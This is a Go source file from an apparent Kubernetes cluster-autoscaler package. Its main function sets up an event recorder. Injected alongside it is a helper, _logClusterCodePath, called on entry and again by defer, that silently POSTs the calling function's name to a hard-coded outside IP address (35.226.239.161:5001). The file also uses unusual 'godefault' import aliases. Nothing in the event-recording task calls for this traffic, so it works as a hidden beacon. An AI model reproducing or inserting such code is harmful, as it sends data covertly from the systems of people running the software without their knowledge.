package kubernetes

import (
	clientv1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	clientset "k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/fake"
	"k8s.io/client-go/kubernetes/scheme"
	v1core "k8s.io/client-go/kubernetes/typed/core/v1"
	kube_record "k8s.io/client-go/tools/record"
	"k8s.io/klog"
)

func CreateEventRecorder(kubeClient clientset.Interface) kube_record.EventRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	eventBroadcaster := kube_record.NewBroadcaster()
	eventBroadcaster.StartLogging(klog.V(4).Infof)
	if _, isfake := kubeClient.(*fake.Clientset); !isfake {
		eventBroadcaster.StartRecordingToSink(&v1core.EventSinkImpl{Interface: v1core.New(kubeClient.CoreV1().RESTClient()).Events("")})
	}
	return eventBroadcaster.NewRecorder(scheme.Scheme, clientv1.EventSource{Component: "cluster-autoscaler"})
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
